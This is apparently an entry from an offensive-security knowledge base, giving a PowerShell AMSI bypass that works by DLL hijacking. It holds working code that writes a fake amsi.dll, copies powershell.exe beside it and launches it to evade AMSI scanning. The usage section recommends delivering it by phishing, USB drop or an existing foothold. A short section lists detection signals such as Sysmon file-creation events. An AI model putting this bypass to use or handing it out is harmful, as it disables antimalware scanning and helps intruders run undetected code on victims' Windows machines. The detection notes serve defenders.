---
id: 921dd32e-812a-42a3-b72c-f73c02f2eb4d
name: PowerShell-AMSI-Bypass-via-DLL-Hijack
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:26.063359+00:00'
updated_at: '2023-04-10T20:36:16.950469+00:00'
platforms:
  - Windows
tags:
  - amsi-bypass
  - dll-hijack
  - powershell
validated: true
---

# PowerShell-AMSI-Bypass-via-DLL-Hijack

## Code

```powershell
[Byte[]] $temp = $DllBytes -split ' '
Write-Output "Executing the bypass."
Write-Verbose "Dropping the fake amsi.dll to disk."
[System.IO.File]::WriteAllBytes("$pwd\amsi.dll", $temp)

Write-Verbose "Copying powershell.exe to the current working directory."
Copy-Item -Path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Destination $pwd

Write-Verbose "Starting powershell.exe from the current working directory."
& "$pwd\powershell.exe"
```

## Description

This PowerShell code snippet performs an AMSI bypass using DLL hijacking. It writes a fake amsi.dll from a provided byte array to the current directory, copies the legitimate powershell.exe there to alter the DLL search path, and launches the executable. This causes PowerShell to load the fake DLL, evading AMSI scans and WMF logging via reflection-like in-memory avoidance. Ideal for red team operations needing undetected PowerShell execution on Windows targets.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $DllBytes | Space-separated string of hex bytes for the fake amsi.dll (must return AMSI_RESULT_CLEAN) | "48 65 6c 6c 6f 20 57 6f 72 6c 64 ..." |
| $pwd | PowerShell's current directory path (auto-resolved) | C:\Users\Victim\Desktop |

## Usage

Embed this code in a larger PowerShell script or run it directly after setting $DllBytes. Use in initial access or privilege escalation phases to spawn a clean PowerShell session for further commands. Deliver via phishing, USB drop, or existing foothold. Ensure write access to $pwd before execution.

## Detection

- File creation events for amsi.dll or unexpected powershell.exe copies in user directories (Sysmon Event ID 11).
- PowerShell process spawning with unusual parent-child relationships or module loads (Event ID 4103/4104).
- Network or registry monitoring for reflection patterns; EDR tools like Defender can flag DLL path hijacks.
- Hash the fake DLL and maintain IOC lists for known bypass artifacts.

## Related

- [[procedures/Bypass-AMSI-via-DLL-Hijacking-and-Reflection]]
- [[commands/powershell-bypass-amsi-dll-hijack]]
